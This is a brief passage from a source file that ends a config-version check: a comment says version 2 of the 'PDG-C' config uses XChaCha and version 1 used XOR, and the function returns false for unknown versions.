    the current config version aka PDG-C v2 uses xchacha.
    v1 used xor.
    */

    // Unknown/unsupported version
    return false;
}